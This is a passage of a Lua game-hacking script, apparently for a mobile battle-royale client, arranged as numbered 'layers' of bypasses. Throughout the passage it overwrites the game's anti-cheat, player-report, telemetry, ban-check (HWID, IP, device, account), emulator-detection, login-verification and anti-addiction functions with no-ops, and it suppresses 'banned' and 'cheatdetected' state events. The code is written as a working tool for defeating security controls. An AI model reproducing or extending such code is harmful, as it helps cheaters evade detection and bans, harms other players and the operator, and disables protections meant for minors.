                "RPC_Server_ClientSecMrpcsFlow","RPC_Server_SwiftHawk",
                "RPC_Server_ClientSwiftHawkWithParams",
                "RPC_Server_ReportSimulateCharacterLocation",
                "RPC_Client_ShootVertifyRes","RPC_ClientCoronaLab"
            }
            _G.SendRPC = function(rpcName, ...)
                for _, b in ipairs(blockedRPC) do
                    if rpcName == b then return nil end
                end
                return origRPC(rpcName, ...)
            end
            _G._SendRPCBypassed = true
            ok = true
        end
    end)
    MarkLayer("L15_NET_PACKET", ok)
end

-- ==============================================================================
-- LAYER 16: HIGGS BOSON FULL BYPASS
-- ==============================================================================
local function L16_HIGGS()
    local ok = false
    pcall(function()
        local Higgs = safe_require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if Higgs then
            local methods = {
                "ControlMHActive","Tick","OnTick","MHActiveLogic","TriggerAvatarCheck",
                "StartAvatarCheck","ReportItemID","ReceiveAnyDamage","OnWeaponHitRecord",
                "ShowSecurityAlert","ServerReportAvatar","ClientReportNetAvatar",
                "SendHisarData","ValidateSecurityData","StaticShowSecurityAlertInDev",
                "RPC_Client_ShootVertifyRes","RPC_Server_ReportSimulateCharacterLocation",
                "DisableHiggsBoson","CheckMHActive","ReportViolation","ProcessSecurityEvent",
                "ValidatePlayer","CheckIntegrity"
            }
            for _, m in ipairs(methods) do
                if Higgs[m] then Higgs[m] = nop end
            end
            Higgs.GetNetAvatarItemIDs = retEmpty
            Higgs.GetCurWeaponSkinID = retZero
            Higgs.IsMHActive = retFalse
            Higgs.bMHActive = false
            Higgs.bCallPreReplication = false
            if Higgs.BlackList then
                for k in pairs(Higgs.BlackList) do Higgs.BlackList[k] = nil end
            end
            ok = true
        end
        _G.BlackList = {}
        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if slua.isValid(pc) then
            if pc.HiggsBoson then
                pc.HiggsBoson.bMHActive = false
                pc.HiggsBoson.bCallPreReplication = false
                if pc.HiggsBoson.ControlMHActive then
                    pcall(function() pc.HiggsBoson:ControlMHActive(0) end)
                end
            end
            if pc.HiggsBosonComponent then
                pc.HiggsBosonComponent.bMHActive = false
                pc.HiggsBosonComponent.bCallPreReplication = false
                pcall(function() pc.HiggsBosonComponent:ControlMHActive(0) end)
            end
            ok = true
        end
        local hia = safe_require("GameLua.Mod.BaseMod.Client.Security.ClientGlueHiaSystem")
        if hia then
            hia.CheckHitIntegrity = nop
            hia.InitSession = nop
            hia.OnBattleEnd = nop
            ok = true
        end
    end)
    MarkLayer("L16_HIGGS", ok)
end

-- ==============================================================================
-- LAYER 17: ANTI-CHEAT CALLBACK HOOKS
-- ==============================================================================
local function L17_ANTICHEAT_HOOKS()
    local ok = false
    pcall(function()
        local HBC = safe_require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if HBC and HBC.StaticShowSecurityAlertInDev then
            HBC.StaticShowSecurityAlertInDev = nop
            ok = true
        end
        if _G.AvatarCheckCallback then
            _G.AvatarCheckCallback.StartAvatarCheck = nop
            _G.AvatarCheckCallback.OnReportItemID = nop
            _G.AvatarCheckCallback.PostPlayerControllerLoginInit = function(PlayerController)
                if slua.isValid(PlayerController) and PlayerController.HiggsBosonComponent then
                    PlayerController.HiggsBosonComponent:ControlMHActive(0)
                    PlayerController.HiggsBosonComponent.bMHActive = false
                end
            end
            ok = true
        end
    end)
    MarkLayer("L17_ANTICHEAT_HOOKS", ok)
end

-- ==============================================================================
-- LAYER 18: ANTI-REPORT PLAYER SUBSYSTEM BYPASS
-- ==============================================================================
local function L18_ANTI_REPORT()
    local ok = false
    pcall(function()
        for _, path in ipairs({
            "GameLua.Mod.BaseMod.Client.Security.ClientReportPlayerSubsystem",
            "Client.Security.ClientReportPlayerSubsystem",
            "GameLua.Mod.BaseMod.DS.Security.DSReportPlayerSubsystem",
            "GameLua.Mod.BaseMod.Common.Security.DSReportPlayerSubsystem"
        }) do
            local sub = package.loaded[path]
            if not sub then
                local s, r = pcall(require, path)
                if s and r then sub = r end
            end
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" and
                       (k:find("Report") or k:find("Record") or k:find("Send") or
                        k:find("Upload") or k:find("Notify") or k:find("Submit")) then
                        pcall(function() sub[k] = nop end)
                        ok = true
                    end
                end
            end
        end
    end)
    MarkLayer("L18_ANTI_REPORT", ok)
end

-- ==============================================================================
-- LAYER 19: GAMEPLAY CALLBACKS (SINGLE WRAP — critical layer)
-- ==============================================================================
local function L19_GAMEPLAY_CALLBACKS()
    local ok = false
    pcall(function()
        if not _G.GameplayCallbacks then _G.GameplayCallbacks = {} end
        local GC = _G.GameplayCallbacks

        if not GC._BypassV5Applied then
            local reports = {
                "ReportAttackFlow","ReportSecAttackFlow","ReportFireArms","ReportVerifyInfoFlow",
                "ReportMrpcsFlow","ReportPlayerBehavior","ReportTeammatHurt","ReportMisKillByTeammate",
                "ReportForbitPick","ReportPlayerMoveRoute","ReportPlayerPosition","ReportVehicleMoveFlow",
                "ReportSecTgameMovingFlow","ReportParachuteData","SendTssSdkAntiDataToLobby",
                "ReportEquipmentFlow","ReportAimFlow","ReportPlayersPing","ReportPlayerIP",
                "ReportPlayerFramePingRecord","OnDSConnectionSaturated","ReportDSNetSaturation",
                "ReportNetContinuousSaturate","ReportDSNetRate","SendClientStats",
                "SendServerAvgTickDelta","ReportCircleFlow","ClientSecMrpcsFlow","SwiftHawk",
                "ClientSwiftHawk","ClientSwiftHawkWithParams","ReportHitFlow","ReportJumpFlow",
                "ReportHurtFlow","ReportHeavyWeaponBoxSpawnFlow","ReportHeavyWeaponBoxActivationFlow"
            }
            for _, f in ipairs(reports) do GC[f] = nop end

            GC.CheckReportSecAttackFlowWithAttackFlow = retFalse
            GC.CheckReportSecAttackFlow = retFalse

            -- Single-wrap of OnDSPlayerStateChanged
            local origState = GC.OnDSPlayerStateChanged
            GC.OnDSPlayerStateChanged = function(UID, State, bPure, bSafe, Param)
                local s = State and string.lower(tostring(State)) or ""
                local block = {
                    ["cheatdetected"]=1, ["connectionlost"]=1, ["connectiontimeout"]=1,
                    ["connectionexception"]=1, ["netdrivererror"]=1, ["banned"]=1,
                    ["kicked"]=1, ["suspended"]=1, ["violationdetected"]=1,
                    ["integrityfailure"]=1, ["securityviolation"]=1
                }
                if block[s] then return end
                if origState then pcall(origState, UID, State, bPure, bSafe, Param) end
            end

            GC.OnPlayerNetConnectionClosed = nop
            GC.OnPlayerActorChannelError = nop
            GC.OnPlayerRPCValidateFailed = nop
            GC.OnPlayerSpectateException = nop
            GC.OnShutdownAfterError = nop

            GC._BypassV5Applied = true
            ok = true
        else
            ok = true
        end
    end)
    MarkLayer("L19_GAMEPLAY_CALLBACKS", ok)
end

-- ==============================================================================
-- LAYER 20: ALL SUBSYSTEMS KILL (real names only)
-- ==============================================================================
local function L20_KILL_SUBSYSTEMS()
    local ok = false
    pcall(function()
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if not SubMgr then return end
        for _, name in ipairs(REAL_SECURITY_SUBSYSTEMS) do
            local sub = SubMgr:Get(name)
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" and
                       (k:find("Report") or k:find("Send") or k:find("Upload") or
                        k:find("Verify") or k:find("Check") or k:find("Validate") or
                        k:find("Scan") or k:find("Detect") or k:find("Collect") or
                        k:find("Flow") or k:find("Heartbeat") or k:find("Tick")) then
                        pcall(function() sub[k] = nop end)
                    end
                end
                if sub.timer then pcall(function() sub:RemoveGameTimer(sub.timer) end) end
                if sub.heartbeatTimer then pcall(function() sub:RemoveGameTimer(sub.heartbeatTimer) end) end
                if sub.reportTimer then pcall(function() sub:RemoveGameTimer(sub.reportTimer) end) end
                ok = true
            end
        end
    end)
    MarkLayer("L20_KILL_SUBSYSTEMS", ok)
end

-- ==============================================================================
-- LAYER 21: TARGETED MODULE STUBBING (no global require hijack)
-- ==============================================================================
-- Instead of replacing _G.require globally (which breaks unrelated requires),
-- we replace the specific modules with safe stubs in package.loaded.
local function L21_MODULE_STUBS()
    local ok = false
    pcall(function()
        local stubPaths = {
            "GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent",
            "GameLua.Mod.BaseMod.Common.Security.PlayerSecurityInfoSubsystem",
            "GameLua.GameCore.Module.Subsystem.CoronaLabSubsystem",
            "GameLua.Mod.BaseMod.Common.Security.ModifierExceptionSubsystem",
            "GameLua.Dev.Subsystem.ShootVerifySubSystemClient",
            "GameLua.Mod.BaseMod.Client.Security.ClientReportPlayerSubsystem",
            "GameLua.Mod.BaseMod.DS.Security.DSReportPlayerSubsystem",
        }
        for _, path in ipairs(stubPaths) do
            local existing = package.loaded[path]
            if existing and type(existing) == "table" then
                -- Keep the table (so live references stay valid) but nop all callables
                for k, v in pairs(existing) do
                    if type(v) == "function" then
                        pcall(function() existing[k] = nop end)
                    end
                end
                ok = true
            end
        end
    end)
    MarkLayer("L21_MODULE_STUBS", ok)
end

-- ==============================================================================
-- LAYER 22: OPERATIONAL STATS BYPASS
-- ==============================================================================
local function L22_OPERATIONAL_STATS()
    local ok = false
    pcall(function()
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        local OSS = (SubMgr and SubMgr:Get("OperationalStatsSubsystem")) or _G.OperationalStatsSubsystem
        if OSS then
            OSS.ReportOperationalStats = nop
            OSS.AddOperationalStats = nop
            OSS.HandleTouchBegin = nop
            OSS.HandleTouchEnd = nop
            OSS.OnInit = nop
            OSS.HandleEnterFighting = nop
            OSS.OnBattleResult = nop
            if OSS.TimerHandle then
                pcall(function() OSS:RemoveGameTimer(OSS.TimerHandle) end)
                OSS.TimerHandle = nil
            end
            OSS.StatsData = {}
            ok = true
        end
    end)
    MarkLayer("L22_OPERATIONAL_STATS", ok)
end

-- ==============================================================================
-- LAYER 23: BASE BYPASS (dev / shipping flags)
-- ==============================================================================
local function L23_BASE()
    local ok = false
    pcall(function()
        local stExtra = import("STExtraBlueprintFunctionLibrary")
        if stExtra and stExtra.IsDevelopment then stExtra.IsDevelopment = nop; ok = true end
        if Client then Client.IsDevelopment = nop; Client.IsShipping = retFalse; ok = true end
        if Server then Server.IsShipping = retFalse; ok = true end

        local ToolReport = safe_require("client.slua.logic.report.ToolReportUtil")
        if ToolReport then
            ToolReport.IsReleaseVersion = retFalse
            ToolReport.IsWhite = retFalse
            ToolReport.GetReportSwitch = retFalse
            ok = true
        end

        local callbacks = _G.GameplayCallbacks
        if callbacks then
            local extra = {
                "ReportHitFlow","SendClientStats","SendServerAvgTickDelta"
            }
            for _, fn in ipairs(extra) do
                if callbacks[fn] then callbacks[fn] = nop end
            end
            ok = true
        end

        if _G.TApmHelper then _G.TApmHelper.postEvent = nop; ok = true end

        local PC = _G.PacketCallbacks
        if PC then
            PC.player_report_cheat = nop
            PC.upload_loots_rsp = nop
            PC.watch_player_exit = nop
            PC.player_login_report = nop
            PC.player_logout_report = nop
            PC.server_time_report = nop
            ok = true
        end

        local sdm = _G.ServerDataMgr
        if sdm and sdm.DeletablePlayerResultKey then
            sdm.DeletablePlayerResultKey["SuspiciousHitCount"] = true
            sdm.DeletablePlayerResultKey["EspTotalSimTraceCnt"] = true
            sdm.DeletablePlayerResultKey["EspTotalImeFocusCnt"] = true
            sdm.DeletablePlayerResultKey["ClientGravityAnomalyCount"] = true
            ok = true
        end

        local pcNotify = safe_require("GameLua.Mod.BaseMod.Common.Security.SecurityNotifyPCFeature")
        if pcNotify then
            pcNotify.ClientRPC_SyncBanID = nop
            pcNotify.ClientRPC_StrongTips = nop
            pcNotify.ClientRPC_NormalTips = nop
            pcNotify.Notify = nop
            pcNotify.ClientRPC_NotifyBan = nop
            pcNotify.ClientRPC_NotifyPunish = nop
            pcNotify.ClientRPC_NotifyIllegalProgram = nop
            ok = true
        end

        local secUtils = safe_require("GameLua.Mod.BaseMod.Common.Security.SecurityCommonUtils")
        if secUtils and secUtils.EStrategyTypeInReplay then
            secUtils.EStrategyTypeInReplay.EspTotalSimTraceCnt = 0
            secUtils.EStrategyTypeInReplay.EspTotalImeFocusCnt = 0
            secUtils.EStrategyTypeInReplay.ClientGravityAnomalyCount = 0
            secUtils.EStrategyTypeInReplay.FlyingErrorCnt = 0
            ok = true
        end
    end)
    MarkLayer("L23_BASE", ok)
end

-- ==============================================================================
-- LAYER 24: BAN SYSTEM BYPASS — ALL BAN TYPES
-- Covers: 1-day, 1-week, 10-year, HWID, device, IP, account.
-- All client-side ban handlers / notify paths silenced.
-- ==============================================================================
local function L24_BAN_SYSTEM()
    local ok = false
    pcall(function()
        -- Core ban logic
        local BanLogic = safe_require("client.slua.logic.ban.ClientBanLogic")
        if BanLogic then
            BanLogic.OnSyncBanInfo = nop
            BanLogic.OnVoiceBanNotify = nop
            BanLogic.OnRealTimeVoiceBanNotify = nop
            BanLogic.OnVoiceBanSuccess = nop
            BanLogic.OnSyncMicSuspicious = nop
            BanLogic.OnSyncMicPreFilter = nop
            BanLogic.OnNotifyWarningTips = nop
            BanLogic.ReqBanInfo = nop
            BanLogic.OnReceiveBanInfo = nop
            BanLogic.ShowBanUI = nop
            BanLogic.OnKickPlayer = nop
            ok = true
        end

        local BanUtil = safe_require("client.common.ban_util") or _G.ban_util
        if BanUtil then
            BanUtil.CheckBanStatus = retFalse
            BanUtil.GetBanTime = retZero
            BanUtil.IsBanForever = retFalse
            BanUtil.GetBanEndTime = retZero
            BanUtil.IsDeviceBanned = retFalse
            BanUtil.IsHWIDBanned = retFalse
            BanUtil.IsIPBanned = retFalse
            ok = true
        end

        -- TT (account) ban
        local TTBan = safe_require("client.logic.login.logic_tt_ban") or _G.logic_tt_ban
        if TTBan then
            TTBan.CheckIfCanCreateRole = nop
            TTBan.GetCarrierInfo = function() return "[{\"mcc\":\"000\"}]" end
            TTBan.OnBanNotify = nop
            ok = true
        end

        -- Godzilla (device/HWID) ban
        local GodzillaBan = safe_require("client.network.Protocol.GodzillaBanHandler")
        if GodzillaBan then
            GodzillaBan.send_godzilla_ban_req = nop
            GodzillaBan.send_godzilla_unban_req = nop
            GodzillaBan.on_godzilla_ban_notify = nop
            ok = true
        end

        -- Anti-addiction (region lock / minor lock)
        local AntiAddiction = safe_require("client.network.Protocol.AntiaddctionHandler")
        if AntiAddiction then
            AntiAddiction.send_anti_addiction_req = nop
            AntiAddiction.send_anti_addiction_notify = nop
            AntiAddiction.on_anti_addiction_notify = nop
            ok = true
        end

        -- Access restriction (region / IP restrictions)
        local AccessRestrict = safe_require("client.network.Protocol.AccessRestrictionHandler")
        if AccessRestrict then
            AccessRestrict.send_access_restriction_req = nop
            AccessRestrict.send_access_restriction_notify = nop
            AccessRestrict.on_player_cheat_state_notify = nop
            AccessRestrict.on_access_restriction_notify = nop
            ok = true
        end

        -- Account deletion / forced GDPR
        local DeleteAccount = safe_require("client.slua.logic.gdpr.logic_deleteaccount")
        if DeleteAccount then
            DeleteAccount.ForceDeleteAccount = retFalse
            DeleteAccount.OnReceiveDeleteNotify = nop
            ok = true
        end

        local ComplianceUtil = safe_require("client.slua.logic.gdpr.compliance_util")
        if ComplianceUtil then ComplianceUtil.CheckCompliance = nop; ok = true end

        -- Security Notify PC (in-game ban popup path)
        local pcNotify = safe_require("GameLua.Mod.BaseMod.Common.Security.SecurityNotifyPCFeature")
        if pcNotify then
            pcNotify.ClientRPC_SyncBanID = nop
            pcNotify.ClientRPC_StrongTips = nop
            pcNotify.ClientRPC_NormalTips = nop
            pcNotify.Notify = nop
            pcNotify.ClientRPC_NotifyBan = nop
            pcNotify.ClientRPC_NotifyPunish = nop
            pcNotify.ClientRPC_NotifyIllegalProgram = nop
            pcNotify.ClientRPC_ShowBanUI = nop
            ok = true
        end
    end)
    MarkLayer("L24_BAN_SYSTEM", ok)
end

-- ==============================================================================
-- LAYER 25: FULL REPORT SYSTEMS BYPASS
-- ==============================================================================
local function L25_REPORT_SYSTEMS()
    local ok = false
    pcall(function()
        local clientReport = safe_require("GameLua.Mod.BaseMod.Client.Security.ClientReportPlayerSubsystem")
        if clientReport then
            for _, fn in ipairs({
                "OnInit","_OnPlayerKilledOtherPlayer","_RecordFatalDamager","SendPacket",
                "ReportSuspiciousPlayer","SubmitReport","_OnBattleResult",
                "_RecordTeammatePlayerInfo","_OnDeathReplayDataWhenFatalDamaged",
                "_RecordMurdererFromDeathReplayData"
            }) do
                if clientReport[fn] then clientReport[fn] = nop end
            end
            ok = true
        end

        local dsReport = safe_require("GameLua.Mod.BaseMod.Common.Security.DSReportPlayerSubsystem")
            or safe_require("GameLua.Mod.BaseMod.DS.Security.DSReportPlayerSubsystem")
        if dsReport then
            for _, fn in ipairs({
                "_OnNearDeathOrRescued","_OnPlayerSettlementStart","_OnTeammateDamage",
                "_OnCharacterDied","_AddEnemyMapToBattleResult","_AddTeammateMapToBattleResult",
                "_SubmitAbnormalData"
            }) do
                if dsReport[fn] then dsReport[fn] = nop end
            end
            ok = true
        end

        local reportUtils = safe_require("GameLua.Mod.BaseMod.Common.Security.ReportPlayerUtils")
        if reportUtils then
            reportUtils.GetBotType = retZero
            reportUtils.IsCharacterDeliverAI = retFalse
            ok = true
        end

        local AvatarSub = safe_require("GameLua.Mod.Library.GamePlay.Avatar.Exception.AvatarExceptionSubsystem")
        if AvatarSub then
            AvatarSub.OnClickReportCheckAvatar = nop
            AvatarSub.RegisterTickCheckCharacterAvatar = nop
            ok = true
        end

        if _G.AvatarExceptionPlayerInst then
            _G.AvatarExceptionPlayerInst.ReportAvatarException = nop
            _G.AvatarExceptionPlayerInst.CheckAvatarException = nop
            _G.AvatarExceptionPlayerInst.CheckCanBugglyPostException = nop
            ok = true
        end

        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local hawk = SubMgr:Get("DSHawkEyePatrolSubsystem")
            if hawk then
                hawk.MarkSuspiciousPlayer = nop
                hawk._OnHawkReport = nop
                hawk._OnHawkImprison = nop
                hawk.CheckPunishPlayer = nop
                ok = true
            end
        end

        local ClientHawk = safe_require("GameLua.Mod.BaseMod.Client.Security.ClientHawkEyePatrolSubsystem")
        if ClientHawk then
            for _, fn in ipairs({
                "_OnHawkSync","_OnHawkReportSuccess","_StartExitGameTimer",
                "_OnRecvInspectorBroadcastCount","SendReportTLog","ReportCheat"
            }) do
                if ClientHawk[fn] then ClientHawk[fn] = nop end
            end
            ClientHawk.CanInspectorBroadcast = retFalse
            ok = true
        end

        local InspectClient = safe_require("GameLua.Mod.BaseMod.Client.Security.InspectionSystemReportClientLogicSubsystem")
        if InspectClient then
            for _, fn in ipairs({
                "AskForInspector","ReportEnemy","KickOutOneTeam","OnReceiveInspectCmd",
                "ClientReportData","SendReportToInspector","SendKickOutOneTeam",
                "ClientNotifyInspectorImplementation","RecvNotifyInspector"
            }) do
                if InspectClient[fn] then InspectClient[fn] = nop end
            end
            ok = true
        end

        local InspectDS = safe_require("GameLua.Mod.BaseMod.DS.Security.InspectionSystemReportDSLogicSubsystem")
        if InspectDS then
            for _, fn in ipairs({
                "ServerKickOutOneTeamByPlayerImplementation","AddReportedCount",
                "AddInspectionRecord","BanPlayerByInspection","BroadCastToAllInspector",
                "ServerReportToInspectorImplementation","InitPlayerInspectionInfo"
            }) do
                if InspectDS[fn] then InspectDS[fn] = nop end
            end
            ok = true
        end
    end)
    MarkLayer("L25_REPORT_SYSTEMS", ok)
end

-- ==============================================================================
-- LAYER 26: TLOG BYPASS (all paths)
-- ==============================================================================
local function L26_TLOG()
    local ok = false
    pcall(function()
        local tlogMods = {
            "client.network.Protocol.ClientTlogHandler",
            "client.network.Protocol.BattleReportHandler",
            "client.network.Protocol.ClientErrorReportHandler",
            "client.network.Protocol.LobbyPingReportHandler",
            "client.slua.config.tlog.tlog_report_utils",
            "client.slua.data.BasicData.BasicDataTLogReport",
            "client.slua.data.BasicData.BasicDataClientReport",
            "client.slua.data.BasicData.BasicDataReport",
            "GameLua.Mod.BaseMod.DS.Security.DSCommonTLogSubsystem",
            "GameLua.Mod.BaseMod.DS.Security.DSFightTLogSubsystem",
            "GameLua.Mod.BaseMod.DS.Security.DSSecurityTLogSubsystem",
            "GameLua.Mod.BaseMod.Client.Security.ClientDataStatistcsSubsystem",
        }
        for _, path in ipairs(tlogMods) do
            local mod = package.loaded[path]
            if mod then
                for k, v in pairs(mod) do
                    if type(v) == "function" and
                       (k:find("Log") or k:find("Report") or k:find("Send") or k:find("Tlog")) then
                        pcall(function() mod[k] = nop end)
                    end
                end
                ok = true
            end
        end

        local AmphibiousBoat = safe_require("GameLua.GameCore.Module.Vehicle.VehicleFeatures.TLog.AmphibiousBoatTLogFeature")
        if AmphibiousBoat then
            AmphibiousBoat.RecordMovement = nop
            AmphibiousBoat.StartRecordMovement = nop
            ok = true
        end

        local ICTLog = safe_require("GameLua.Mod.BaseMod.DS.Security.ICTLogSubsystem")
        if ICTLog then ICTLog.SendICExceptionTLog = nop; ok = true end

        local DSFight = safe_require("GameLua.Mod.BaseMod.DS.Security.DSFightTLogSubsystem")
        if DSFight then
            DSFight.GetSimpleFightData = retEmpty
            DSFight.ReportFightData = nop
            DSFight.ReportPlayerWeapon = nop
            ok = true
        end

        local DSSec = safe_require("GameLua.Mod.BaseMod.DS.Security.DSSecurityTLogSubsystem")
        if DSSec then
            DSSec._OnReportServerJumpFlow = nop
            DSSec._OnReportTeleportFlow = nop
            DSSec._OnReportSpeedHackFlow = nop
            ok = true
        end

        local DSCommon = safe_require("GameLua.Mod.BaseMod.DS.Security.DSCommonTLogSubsystem")
        if DSCommon then DSCommon.HandleKillTlog = nop; ok = true end

        local PufferTlog = safe_require("client.slua.logic.download.report.puffer_tlog")
        if PufferTlog then PufferTlog.report_download_tlog = nop; ok = true end
    end)
    MarkLayer("L26_TLOG", ok)
end

-- ==============================================================================
-- LAYER 27: NETWORK HANDLER BYPASS
-- ==============================================================================
local function L27_NET_HANDLERS()
    local ok = false
    pcall(function()
        local ClientError = safe_require("client.network.Protocol.ClientErrorReportHandler")
        if ClientError then
            ClientError.send_client_error_report = nop
            ClientError.send_client_crash_report = nop
            ClientError.send_client_tools_batch_report_req = nop
            ok = true
        end

        local BattleReport = safe_require("client.network.Protocol.BattleReportHandler")
        if BattleReport then
            for _, fn in ipairs({
                "send_battle_report","send_battle_result","send_vod_game_report_req",
                "send_batch_get_vod_info_req","send_get_game_report_req",
                "send_batch_get_game_report_req","send_get_game_report_by_uid_req"
            }) do
                if BattleReport[fn] then BattleReport[fn] = nop end
            end
            ok = true
        end

        local BugHandler = safe_require("client.network.Protocol.BugHandler")
        if BugHandler then
            BugHandler.send_report_bug_info = nop
            BugHandler.send_report_bug_feedback = nop
            ok = true
        end

        local PingReport = safe_require("client.network.Protocol.LobbyPingReportHandler")
        if PingReport then
            PingReport.send_lobby_ping_report = nop
            PingReport.send_ingame_ping_report = nop
            ok = true
        end

        local WeekReport = safe_require("client.network.Protocol.WeekRportHandler")
        if WeekReport then
            WeekReport.send_week_report = nop
            WeekReport.send_week_detail = nop
            ok = true
        end

        local LogicComplaint = safe_require("client.logic.battle.logic_complaint")
        if LogicComplaint then
            LogicComplaint.SendComplaintReq = nop
            LogicComplaint.Submit = nop
            LogicComplaint.ReportPlayer = nop
            LogicComplaint.ShowComplaint = nop
            LogicComplaint.ShowHandle = nop
            ok = true
        end

        local OBResult = safe_require("GameLua.Mod.BaseMod.Client.BattleResult.ProcessBase.EscapeBattleResultShowOBResultLogic")
        if OBResult then
            OBResult.OnBattleResult = nop
            OBResult.OnResultProcessStart = nop
            ok = true
        end

        local NormalOBResult = safe_require("GameLua.Mod.BaseMod.Client.BattleResult.ProcessBase.BattleResultShowOBResultLogic")
        if NormalOBResult then
            NormalOBResult.OnBattleResult = nop
            NormalOBResult.OnResultProcessStart = nop
            ok = true
        end

        local ShowResult = safe_require("GameLua.Mod.BaseMod.Client.BattleResult.ProcessBase.BattleResultShowResultLogic")
        if ShowResult then
            for _, fn in ipairs({
                "OnBattleResult","OnResultProcessStart","OnResultProcessContinue",
                "ReceiveData","SendEndFlow","OnReport","ShowResult",
                "ShowResultInternal","StopResultProcess"
            }) do
                if ShowResult[fn] then ShowResult[fn] = nop end
            end
            ok = true
        end
    end)
    MarkLayer("L27_NET_HANDLERS", ok)
end

-- ==============================================================================
-- LAYER 28: MISC BYPASS (emulator, verify, voice, etc.)
-- ==============================================================================
local function L28_MISC()
    local ok = false
    pcall(function()
        local EmuHandler = safe_require("client.network.Protocol.EmulatorHandler")
        if EmuHandler then EmuHandler.send_emulator_info = nop; ok = true end

        local EmuScanner = safe_require("client.logic.login.emulator_scanner")
        if EmuScanner then
            EmuScanner.StartScan = nop
            EmuScanner.GetScanResult = retFalse
            EmuScanner.ReportScanResult = nop
            ok = true
        end

        local LoginVerify = safe_require("client.network.Protocol.LoginVerifyHandler")
        if LoginVerify then
            LoginVerify.send_login_verify_req = nop
            LoginVerify.send_device_verify_req = nop
            ok = true
        end

        local DSMonitor = safe_require("client.logic.data.logic_ds_monitor")
        if DSMonitor then
            DSMonitor.OnRecordMsg = nop
            DSMonitor.OnReportMsg = nop
            ok = true
        end

        local ClientDataStat = safe_require("GameLua.Mod.BaseMod.Client.Security.ClientDataStatistcsSubsystem")
        if ClientDataStat then
            ClientDataStat.StartToCheck = nop
            ClientDataStat.OnReceiveRTT = nop
            ClientDataStat.OnReceiveJitter = nop
            ClientDataStat.ReportAbnormal = nop
            ClientDataStat.ResetData = nop
            ok = true
        end

        local shootVerify = safe_require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if shootVerify then
            shootVerify.OnShootVerifyFailed = nop
            shootVerify.SendVerifyData = nop
            ok = true
        end

        local HighlightDS = safe_require("GameLua.Mod.BaseMod.DS.Security.HighlightMomentSubsystem_DSChecker")
        if HighlightDS then HighlightDS.CheckFuncUpgradedWeaponKill = nop; ok = true end

        local ProfileReport = safe_require("client.logic.data.profile_report_cfg")
        if ProfileReport then ProfileReport.SendReport = nop; ok = true end

        local VoiceReport = safe_require("client.slua.logic.chat_voice.logic_chat_voice_report")
        if VoiceReport then
            VoiceReport.ReportVoiceData = nop
            VoiceReport.ReportVoiceText = nop
            ok = true
        end

        local VoiceDoctor = safe_require("client.slua.logic.chat_voice.logic_chat_voice_doctor")
        if VoiceDoctor then
            VoiceDoctor.UploadVoiceLog = nop
            VoiceDoctor.UploadVoiceException = nop
            ok = true
        end

        local HomeAudit = safe_require("client.slua.logic.home.Audit.logic_home_audit_state")
        if HomeAudit then
            HomeAudit.SendAuditState = nop
            HomeAudit.ReportAuditResult = nop
            ok = true
        end

        local HomeReport = safe_require("client.slua.logic.home.logic_home_report")
        if HomeReport then
            HomeReport.ReportHomeData = nop
            HomeReport.ReportHomeVisitor = nop
            ok = true
        end

        local GemReport = safe_require("client.logic.store.gem_report_utils")
        if GemReport then
            GemReport.ReportGemData = nop
            GemReport.ReportGemPurchase = nop
            ok = true
        end

        local SafeStation = safe_require("client.slua.logic.CustomerService.LogicSafeStation")
        if SafeStation then
            SafeStation.UploadVideoEvidence = nop
            SafeStation.ReportPlayerBehavior = nop
            ok = true
        end

        local CustomerService = safe_require("client.slua.logic.CustomerService.LogicCustomerService")
        if CustomerService then
            CustomerService.SendComplaint = nop
            CustomerService.SendFeedback = nop
            ok = true
        end
    end)
    MarkLayer("L28_MISC", ok)
end

-- ==============================================================================
-- LAYER 29: EXTRA SUBSYSTEMS BYPASS
-- ==============================================================================
local function L29_EXTRA_SUBSYSTEMS()
    local ok = false
    pcall(function()
        local znq6Revive = safe_require("GameLua.Mod.TDEvent.ZNQ6th.DS.ZNQ6thDSReviveSubsystem")
        if znq6Revive then znq6Revive.HaveNewItemForRevive = nop; ok = true end

        local znq7Revive = safe_require("GameLua.Mod.TDEvent.ZNQ7th.DS.ZNQ7DSReviveSubsystem")
        if znq7Revive then znq7Revive.HaveChanceRevival = nop; ok = true end

        local DataLayer = safe_require("GameLua.Mod.BaseMod.Common.Subsystem.DataLayerSubsystem")
        if DataLayer then
            local orig = DataLayer.OnSpectatorReplayChanged
            if orig and not DataLayer._WrappedV5 then
                DataLayer.OnSpectatorReplayChanged = function(dlSelf)
                    _G.IsBeingWatched = true
                    orig(dlSelf)
                end
                DataLayer._WrappedV5 = true
            end
            ok = true
        end

        local DSActive = safe_require("GameLua.Mod.PlanBT.Gameplay.Subsystem.DSActiveSubsystem")
        if DSActive then
            DSActive.DelayKickOutPlayer = nop
            DSActive.ActiveKickNotify = nop
            ok = true
        end

        local CreativeDev = safe_require("GameLua.Mod.CreativeBase.Gameplay.Subsystem.CreativeDevDebugSubsystem")
        if CreativeDev then CreativeDev.IsDebugPanelEnalbedCli = nop; ok = true end

        local CreativeDeath = safe_require("GameLua.Mod.CreativeBase.Gameplay.Subsystem.CreativeModeDeathRecordSubsystem")
        if CreativeDeath then CreativeDeath.OnPlayerKilled = nop; ok = true end

        local SpectateReplay = safe_require("GameLua.Mod.BaseMod.Common.Subsystem.SpectateAndReplaySubsystem")
        if SpectateReplay then
            SpectateReplay.RequestGotoSpectatingImp = nop
            SpectateReplay.RequestGotoSpectating = nop
            ok = true
        end

        local AIReplay = safe_require("GameLua.ExtraModule.MLAI.Client.AIReplaySubsystem")
        if AIReplay then
            AIReplay.ReportAllPlayerInfo = nop
            AIReplay.ReportFrameData = nop
            AIReplay.ReportPlayerInput = nop
            if AIReplay.uCompletePlayBack then
                AIReplay.uCompletePlayBack.AddRecordMLAIInfo = nop
                AIReplay.uCompletePlayBack.StopRecording = nop
            end
            ok = true
        end

        local AITracking = safe_require("GameLua.Mod.BaseMod.GamePlay.AI.AITrackingLogSubsystem")
        if AITracking then
            AITracking.RealLogoutTimer = nop
            AITracking.LogQueue = {}
            AITracking.AddToLogQue = nop
